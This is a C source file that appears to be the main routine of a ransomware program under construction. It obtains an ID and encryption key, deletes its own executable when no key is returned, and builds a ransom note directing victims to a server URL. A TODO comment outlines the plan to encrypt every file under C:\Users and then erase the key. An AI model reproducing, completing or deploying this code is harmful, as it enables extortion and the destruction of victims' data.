#include <stdio.h>
#include "utils.h"
#include "delete.h"
#include "config.h"

int main(int argc, char *argv[]) {
    /*
    #ifndef _WIN32
        self_delete(argv[0]);
    #endif
    */
    char key[65];
    int id;
    get_key(&id, key); // error setting the id
    printf("ID: %d\n", id);
    printf("Key: %s\n", key);
    if (key && !key[0]) {
        self_delete(argv[0]);
    }
    /*TODO:
        write a README on user desktop with server url and id
        foreach files != (README.txt || paths.txt) from 'C:\Users' call encrypt(filepath, key)
            success   -> add filepath to paths.txt 
            exception ->  pass
        delete key from memory
    */
    char readme[256];
    snprintf(readme, sizeof(readme), "All you're files were encrypted, go to http://%s:%d\nYou're ID is: %d", SERVER_IP, SERVER_PORT, id);
    printf("Concatenated string: %s\n", readme);

    return 0;
}
